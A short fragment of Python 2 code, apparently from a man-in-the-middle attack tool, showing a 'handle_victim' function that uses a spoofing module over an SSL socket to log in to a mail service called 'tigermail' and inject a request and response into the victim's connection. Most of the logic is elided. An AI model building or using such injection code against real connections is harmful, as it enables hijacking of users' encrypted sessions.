...
def handle_victim(victim, options, mitmcount):
    ...
    # inject prefix
    tms = tmspoof.TMSpoof(sslsock)
    if not tms.DoLogin():
        print threading.current_thread().name, "Coudn't login to tigermail!! Closing Socket"
        sys.exit(1)      
        
    tms.DoLogout()
    print threading.current_thread().name, 'Injected Tigermail Request/Response'
